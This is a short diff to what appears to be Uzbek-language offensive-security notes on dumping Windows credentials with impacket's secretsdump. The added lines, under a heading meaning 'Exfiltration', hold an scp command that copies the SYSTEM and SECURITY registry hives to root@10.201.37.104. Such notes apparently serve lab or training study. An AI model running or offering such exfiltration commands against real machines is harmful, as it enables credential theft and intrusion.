@@ -53,6 +53,11 @@ python3.9 /opt/impacket/examples/secretsdump.py \
   local
 ```
 
+Olib chiqish:
+```
+scp .\SYSTEM .\SECURITY root@10.201.37.104:/root/Desktop/
+```
+
 ---
 
 ## 🌐 **Masofaviy Dumping (Kirish ma’lumotlari bilan)**
